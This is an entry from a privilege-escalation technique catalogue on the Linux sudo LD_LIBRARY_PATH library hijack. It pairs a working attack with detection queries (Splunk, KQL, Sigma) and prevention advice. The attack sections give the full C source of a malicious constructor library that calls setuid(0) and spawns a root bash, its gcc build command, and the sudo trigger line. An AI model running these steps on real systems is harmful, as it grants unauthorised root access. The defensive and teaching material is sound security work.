name: LD_LIBRARY_PATH sudo env_keep library hijack
command: sudo LD_LIBRARY_PATH=/tmp <allowed_binary>   # load attacker .so as root
description: When sudoers preserves LD_LIBRARY_PATH (via Defaults env_keep+=LD_LIBRARY_PATH) for a command a user may run as root, the attacker builds a malicious shared object exporting a symbol the target binary resolves, places it in a writable directory, and points LD_LIBRARY_PATH there. The dynamic linker loads the attacker library into the root process, running attacker code as root. A classic GTFOBins-style sudo environment-variable hijack distinct from LD_PRELOAD.
notes:
=== WHAT IT IS ===
  LD_LIBRARY_PATH adds directories the dynamic linker searches for shared libraries
  BEFORE the system paths. If sudo keeps this variable for a root-allowed command,
  you can force that command to load YOUR library instead of the real one.

=== CHECK ===
  sudo -l
  # look for:  env_keep+=LD_LIBRARY_PATH   AND a command you can run as root
  # find which libs the target needs:
  ldd /path/to/allowed_binary

=== BUILD MALICIOUS .so ===
  # Replace a library the binary loads (e.g. libcrypt.so.1). Use a constructor so
  # it fires on load regardless of which symbol is resolved:
  cat > /tmp/lib.c <<'EOF'
  #include <stdio.h>
  #include <stdlib.h>
  #include <unistd.h>
  static void init(void) __attribute__((constructor));
  void init(void){ setuid(0); setgid(0); system("/bin/bash -p"); }
  EOF
  gcc -shared -fPIC -nostartfiles -o /tmp/libcrypt.so.1 /tmp/lib.c

=== TRIGGER ===
  sudo LD_LIBRARY_PATH=/tmp <allowed_binary>
  # linker finds /tmp/libcrypt.so.1 first, constructor runs as root -> root shell

=== NOTE vs LD_PRELOAD ===
  LD_PRELOAD force-loads one file; LD_LIBRARY_PATH changes the SEARCH PATH so a
  same-named library in your dir wins. Use LD_LIBRARY_PATH when env_keep allows it
  but LD_PRELOAD is stripped.

=== ALTERNATIVES ===
  ld-preload (LD_PRELOAD variant); GTFOBins per-binary library tricks

examples.label: Build a constructor .so matching a needed library name
Run the allowed binary with the hijacked search path

recommended.note: LD_PRELOAD variant of the same sudo library-hijack.
Enumerate other local vectors when env_keep is absent.

defense.why_it_works: The dynamic linker searches LD_LIBRARY_PATH directories before the default system paths. sudo normally scrubs dangerous environment variables, but if sudoers explicitly preserves LD_LIBRARY_PATH via env_keep, the attacker-controlled directory is searched first while the command runs as root, so a same-named malicious library is loaded into the privileged process.
defense.prerequisites: A sudoers rule letting the user run a dynamically-linked command as root, with Defaults env_keep+=LD_LIBRARY_PATH (ld.so ignores LD_LIBRARY_PATH for SUID binaries, so this specifically needs the sudo env_keep misconfiguration). A writable directory and gcc (or a precompiled .so).
defense.impact: Arbitrary code execution as root via a hijacked shared library - a direct, quiet local privilege escalation from a single sudoers misconfiguration.
defense.detection: [MITRE T1574.006] sudo invocations carrying LD_LIBRARY_PATH; root processes loading shared objects from world-writable paths (/tmp, /dev/shm, user home); auditd showing a root-owned process dlopen-ing a library outside standard library directories.
defense.artifacts: sudo logs recording the preserved LD_LIBRARY_PATH; auditd execve with LD_LIBRARY_PATH in the environment; a .so in /tmp or /dev/shm loaded by a setuid-root process; recently compiled library with a system library name in a writable dir.
defense.splunk_spl:
index=linux sourcetype="linux:auditd" type=EXECVE
| search (a0="*LD_LIBRARY_PATH=*" OR proctitle="*LD_LIBRARY_PATH=*") proctitle="*sudo*"
| table _time, host, auid, exe, proctitle
defense.sentinel_kql:
Syslog
| where SyslogMessage has "sudo" and SyslogMessage has "LD_LIBRARY_PATH"
| project TimeGenerated, Computer, SyslogMessage
| sort by TimeGenerated desc
// sudo preserving LD_LIBRARY_PATH to load an attacker library as root
defense.sigma_rules: lnx_sudo_ld_library_path_hijack (sudo command run with an attacker LD_LIBRARY_PATH)
defense.prevention: Never add LD_LIBRARY_PATH (or LD_PRELOAD) to sudoers env_keep; rely on sudo's default env_reset. Audit /etc/sudoers and /etc/sudoers.d for env_keep entries. Keep sudo current and grant the narrowest possible commands.

detections.name: sudo with attacker LD_LIBRARY_PATH (library hijack)
detections.logic:
Syslog
| where SyslogMessage has "sudo" and SyslogMessage has "LD_LIBRARY_PATH"
| where SyslogMessage has_any ("/tmp","/dev/shm","/home")
| project TimeGenerated, Computer, SyslogMessage
detections.false_positives: Developers occasionally set LD_LIBRARY_PATH, but rarely through sudo to a world-writable directory.
detections.tuning: Alert specifically when LD_LIBRARY_PATH points at /tmp, /dev/shm or a user-writable path under sudo.
